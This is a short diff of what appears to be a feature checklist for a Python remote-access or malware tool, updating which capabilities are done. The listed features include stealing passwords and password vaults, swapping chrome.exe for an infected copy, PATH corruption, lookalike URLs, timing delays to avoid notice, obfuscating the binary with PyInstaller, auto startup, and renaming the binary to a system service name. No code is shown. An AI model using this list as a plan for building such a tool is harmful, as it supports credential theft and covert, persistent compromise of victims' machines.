@@ -7,15 +7,15 @@
 + upload a file
 + search for any file by name
 - use a URL similar to a commonly used URL
-- very delays between commands
-- replace a file with another (Ex. chrome.exe with an infected chrome.exe)
++ very delays between commands
++ replace a file with another (Ex. chrome.exe with an infected chrome.exe)
 + steal passwords and password vaults
 + zip up any directory for upload
-~ PATH corruption
++ PATH corruption
 + get OS, RAM, Disk, CPU Count, CPU Type, Number of Network Interfaces (psutil)
 + Encrypt and Obfuscate binary (PyInstaller --key)
-- Make Windows Binary (PyInstaller)
-- Make Linux Binary (PyInstaller)
++ Make Windows Binary (PyInstaller)
++ Make Linux Binary (PyInstaller)
 + OS Binary (PyInstaller)
 - Auto startup
-- Rename binary to common system service
+~ Rename binary to common system service
